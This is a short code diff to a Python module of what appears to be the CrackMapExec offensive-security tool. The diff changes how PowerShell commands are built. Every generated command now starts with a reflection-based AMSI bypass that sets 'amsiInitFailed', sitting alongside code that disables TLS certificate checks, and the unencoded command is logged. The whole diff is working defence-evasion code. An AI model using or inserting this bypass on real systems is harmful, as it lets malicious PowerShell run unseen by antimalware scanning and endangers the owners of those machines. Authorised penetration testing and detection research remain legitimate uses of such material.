@@ -3,6 +3,7 @@ import string
 import re
 import cme
 import os
+import logging
 from base64 import b64encode
 from termcolor import colored
 
@@ -43,7 +44,15 @@ def obfs_ps_script(script, function_name=None):
     return strippedCode
 
 def create_ps_command(ps_command, force_ps32=False):
-    ps_command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + ps_command
+    ps_command = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
+try{{ 
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+}}catch{{}}
+{}
+""".format(ps_command)
+
+    logging.debug('Unincoded command:\n' + ps_command)
+
     if force_ps32:
         command = """$command = '{}'
 if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') 
